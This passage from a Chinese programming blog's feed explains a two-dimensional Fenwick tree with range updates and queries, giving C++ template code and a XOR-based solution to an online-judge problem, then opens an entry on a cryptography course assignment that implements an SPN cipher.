mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>次，以此类推，上式可以转化为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>y</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>x</mi></msubsup><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>y</mi></msubsup><mi>d</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>−</mo><mo stretchy="false">(</mo><mi>y</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>x</mi></msubsup><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>y</mi></msubsup><mi>d</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>∗</mo><mi>i</mi><mo>−</mo><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>x</mi></msubsup><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>y</mi></msubsup><mi>d</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>∗</mo><mi>j</mi><mo>+</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>x</mi></msubsup><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>y</mi></msubsup><mi>d</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>∗</mo><mi>i</mi><mo>∗</mo><mi>j</mi></mrow><annotation encoding="application/x-tex">(x+1)*(y+1)*\sum_{i=1}^x\sum_{j=1}^yd[i][j]-(y-1)*\sum_{i=1}^x\sum_{j=1}^yd[i][j]*i-(x-1)*\sum_{i=1}^x\sum_{j=1}^yd[i][j]*j+\sum_{i=1}^x\sum_{j=1}^yd[i][j]*i*j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.24011em;vertical-align:-0.43581800000000004em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029000000000005em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">d</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.24011em;vertical-align:-0.43581800000000004em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029000000000005em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">d</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.24011em;vertical-align:-0.43581800000000004em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029000000000005em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">d</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.24011em;vertical-align:-0.43581800000000004em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029000000000005em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">d</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span>。也就是我们要维护四个树状数组：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>∗</mo><mi>i</mi><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>∗</mo><mi>j</mi><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>∗</mo><mi>i</mi><mo>∗</mo><mi>j</mi></mrow><annotation encoding="application/x-tex">d[i][j],d[i][j]*i,d[i][j]*j,d[i][j]*i*j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">d</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">d</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">d</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span>。</p>
<p>模板如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> X = x; X &lt;= n; X += <span class="built_in">lowbit</span>(X))</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> Y = y; Y &lt;= m; Y += <span class="built_in">lowbit</span>(Y)) &#123;</span><br><span class="line">			t1[X][Y] += val;</span><br><span class="line">			t2[X][Y] += val *x;</span><br><span class="line">			t3[X][Y] += val * y;</span><br><span class="line">			t4[X][Y] += val * x * y;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">range_update</span><span class="params">(<span class="keyword">int</span> xa, <span class="keyword">int</span> ya, <span class="keyword">int</span> xb, <span class="keyword">int</span> yb, <span class="keyword">int</span> val)</span> </span>&#123; </span><br><span class="line">	<span class="built_in">update</span>(xa, ya, val);</span><br><span class="line">	<span class="built_in">update</span>(xa, yb + <span class="number">1</span>, -val);</span><br><span class="line">	<span class="built_in">update</span>(xb + <span class="number">1</span>, ya, -val);</span><br><span class="line">	<span class="built_in">update</span>(xb + <span class="number">1</span>, yb + <span class="number">1</span>, val);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = x; i; i -= i &amp; -i)</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = y; j; j -= j &amp; -j)</span><br><span class="line">			res += (x + <span class="number">1</span>) * (y + <span class="number">1</span>) * t1[i][j]</span><br><span class="line">			- (y + <span class="number">1</span>) * t2[i][j]</span><br><span class="line">			- (x + <span class="number">1</span>) * t3[i][j]</span><br><span class="line">			+ t4[i][j];</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">range_query</span><span class="params">(<span class="keyword">int</span> xa, <span class="keyword">int</span> ya, <span class="keyword">int</span> xb, <span class="keyword">int</span> yb)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">query</span>(xb, yb) - <span class="built_in">query</span>(xb, ya - <span class="number">1</span>) - <span class="built_in">query</span>(xa - <span class="number">1</span>, yb) + <span class="built_in">query</span>(xa - <span class="number">1</span>, ya - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目链接：<a href="http://10.12.162.1:5880/contest/22/problem/P0402">oj | 宝藏</a></p>
<p>代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">2500</span> + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> K = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> t1[N][N], t2[N][N], t3[N][N], t4[N][N];</span><br><span class="line"><span class="keyword">int</span> m, n, k;</span><br><span class="line"><span class="keyword">int</span> X1, Y1, X2, Y2;</span><br><span class="line"><span class="keyword">int</span> ak, bk;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ans, val;</span><br><span class="line"><span class="keyword">char</span> op;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x &amp; -x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">unsigned</span> <span class="keyword">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//更新点（x，y）及之后的前缀和（矩形）</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> X = x; X &lt;= n; X += <span class="built_in">lowbit</span>(X))</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> Y = y; Y &lt;= n; Y += <span class="built_in">lowbit</span>(Y)) &#123;</span><br><span class="line">			t1[X][Y] ^= p;</span><br><span class="line">			t2[X][Y] ^= ((y) &amp; <span class="number">1</span>) ? p : <span class="number">0</span>;	<span class="comment">//如果(y-1)是偶数，乘以任何数也是偶数，对结果不影响</span></span><br><span class="line">			t3[X][Y] ^= ((x) &amp; <span class="number">1</span>) ? p : <span class="number">0</span>;</span><br><span class="line">			t4[X][Y] ^= ((x)&amp;(y) &amp; <span class="number">1</span>) ? p : <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">range_update</span><span class="params">(<span class="keyword">int</span> xa, <span class="keyword">int</span> ya, <span class="keyword">int</span> xb, <span class="keyword">int</span> yb, <span class="keyword">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//更新四个矩形区域，由于是01矩阵，减和加效果相同</span></span><br><span class="line">	<span class="built_in">update</span>(xa, ya, p);<span class="comment">//(xa,ya)-&gt;(n,n)</span></span><br><span class="line">	<span class="built_in">update</span>(xa, yb + <span class="number">1</span> ,p);<span class="comment">//(xa,yb+1)-&gt;(n,n),效果等于-p</span></span><br><span class="line">	<span class="built_in">update</span>(xb + <span class="number">1</span>, ya, p);<span class="comment">//（xb+1,ya)-&gt;(n,n),效果等于-p</span></span><br><span class="line">	<span class="built_in">update</span>(xb + <span class="number">1</span>, yb + <span class="number">1</span>, p);<span class="comment">//(xb+1,yb+1)-&gt;(n,n),效果为+3p+p为不变</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> x , <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//查询点(x,y)的前缀和,(x,y)-&gt;(1,1)</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = x; i; i -= <span class="built_in">lowbit</span>(i))</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = y; j; j -= <span class="built_in">lowbit</span>(j))</span><br><span class="line">			ans ^= (((x + <span class="number">1</span>)&amp;(y + <span class="number">1</span>)&amp;<span class="number">1</span>)?t1[i][j]:<span class="number">0</span>)^</span><br><span class="line">			(((x + <span class="number">1</span>) &amp; <span class="number">1</span>) ? t2[i][j] : <span class="number">0</span>) ^</span><br><span class="line">			(((y + <span class="number">1</span>) &amp; <span class="number">1</span>) ? t3[i][j] : <span class="number">0</span>) ^</span><br><span class="line">			t4[i][j];</span><br><span class="line">	<span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">range_query</span><span class="params">(<span class="keyword">int</span> xa, <span class="keyword">int</span> ya, <span class="keyword">int</span> xb, <span class="keyword">int</span> yb)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//四个矩形区域</span></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">query</span>(xb, yb) ^ <span class="built_in">query</span>(xb, ya - <span class="number">1</span>) ^ <span class="built_in">query</span>(xa - <span class="number">1</span>, yb) ^ <span class="built_in">query</span>(xa - <span class="number">1</span>, ya - <span class="number">1</span>)  ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">	<span class="keyword">while</span> (m--) &#123;</span><br><span class="line">		cin &gt;&gt; op;</span><br><span class="line">		<span class="keyword">if</span> (op == <span class="string">&#x27;P&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			val = <span class="number">0</span>;</span><br><span class="line">			cin &gt;&gt; X1 &gt;&gt; Y1 &gt;&gt; X2 &gt;&gt; Y2 &gt;&gt; k;</span><br><span class="line">			<span class="keyword">while</span> (k--)</span><br><span class="line">			&#123;</span><br><span class="line">				cin &gt;&gt; ak &gt;&gt; bk;</span><br><span class="line">				<span class="keyword">if</span> (bk &amp; <span class="number">1</span>)</span><br><span class="line">					val ^= (<span class="number">1</span> &lt;&lt; ak);<span class="comment">//只有奇数个有更新的必要，偶数个不影响结果</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">range_update</span>(X1, Y1, X2, Y2, val);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (op == <span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			cin &gt;&gt; X1 &gt;&gt; Y1 &gt;&gt; X2 &gt;&gt; Y2;</span><br><span class="line">			ans = <span class="built_in">range_query</span>(X1, Y1, X2, Y2);</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">30</span>; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				ans = ans &gt;&gt; <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">if</span> (ans &amp; <span class="number">1</span>)</span><br><span class="line">					cout &lt;&lt; <span class="number">2</span>;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					cout &lt;&lt; <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">				cout &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学课设</title>
    <url>/2021/10/30/%E5%AF%86%E7%A0%81%E5%AD%A6%E8%AF%BE%E8%AE%BE/</url>
    <content><![CDATA[<hr />
<div class="note pink icon simple"><i class="note-icon fas fa-car-crash"></i><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mi>J</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">OJ\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.09618em;">J</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>地址为：<a href="http://10.12.162.1:5880/contest/20/problems">oj | 2021年密码学课程设计</a></p>
</div>
<hr />
<h4 id="spn实现"><a class="markdownIt-Anchor" href="#spn实现"></a> SPN实现</h4>
<p>题目链接：<a href="http://10.12.162.1:5880/contest/20/problem/I">oj | SPN实现</a></p>
<p>题目要求：<img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211030100423.png" alt="SPN实现" /></p>
